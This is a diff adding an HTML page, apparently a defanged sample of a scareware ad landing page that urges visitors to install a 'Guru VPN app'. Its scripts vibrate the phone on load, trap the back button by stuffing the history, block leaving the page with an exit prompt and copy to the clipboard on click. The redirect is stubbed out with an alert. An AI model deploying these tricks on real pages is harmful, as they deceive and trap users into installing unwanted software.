@@ -1,0 +1,92 @@
+ <!DOCTYPE html>
+<html>
+<head>
+    <base href="">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>VPN is recommended!</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <script>
+        navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+        navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000]);
+    </script>
+</head>
+<body class="bg--dark">
+    <script type="text/javascript">
+        function AlertIt() {
+            alert("Example redirection function triggered, but no actual redirection.");
+        }
+    </script>
+    <a href="javascript:AlertIt();">
+        <div class="wrapper">
+            <div class="content">
+                <main class="main" role="main">
+                    <div class="box">
+                        <div class="box__inner text-center">
+                            <div class="box__inner-top">
+                                <p><b>VPN is recommended!</b></p>
+                                <p>This will secure your stay on this website.</p>
+                            </div>
+                            <div class="box__inner-text">
+                                <p><b>Follow these simple steps:</b></p>
+                                <p><b>Step 1:</b> Install the Guru VPN app</p>
+                                <p><b>Step 2:</b> Launch the app and press “Protect”</p>
+                            </div>
+                            <div class="box__inner_meta">
+                                <div class="box__inner-icons">
+                                    <i class="icon-reload"></i>
+                                    <i class="icon-sound"></i>
+                                    <i class="icon-info"></i>
+                                </div>
+                                <span class="box__inner-btn">Install Now</span>
+                            </div>
+                        </div>
+                    </div>
+                </main>
+            </div>
+        </div>
+    </a>
+    <p>
+        <a href="javascript:AlertIt();"></a>
+        <a class="js-emaillink"></a>
+    </p>
+    <script>
+        var copyEmailBtn = document.querySelector('.wrapper');
+        copyEmailBtn.addEventListener('click', function(event) {
+            var emailLink = document.querySelector('.js-emaillink');
+            var range = document.createRange();
+            range.selectNode(emailLink);
+            window.getSelection().addRange(range);
+            try {
+                var successful = document.execCommand('copy');
+                var msg = successful ? 'successful' : 'unsuccessful';
+                console.log('Copy email command was ' + msg);
+            } catch (err) {
+                console.log('Oops, unable to copy');
+            }
+            window.getSelection().removeAllRanges();
+        });
+    </script>
+    <script type="text/javascript">
+        (function() {
+            try {
+                for (var t = 0; t < 10; ++t) history.pushState({}, "", "#");
+                onpopstate = function(t) {
+                    if (t.state) location.replace("#");
+                };
+            } catch (o) {}
+        })();
+    </script>
+    <script type="text/javascript">
+        var PreventExitPop = true;
+        function ExitPop() {
+            if (PreventExitPop) {
+                return "text";
+            }
+        }
+        window.onbeforeunload = ExitPop;
+    </script>
+</body>
+</html>
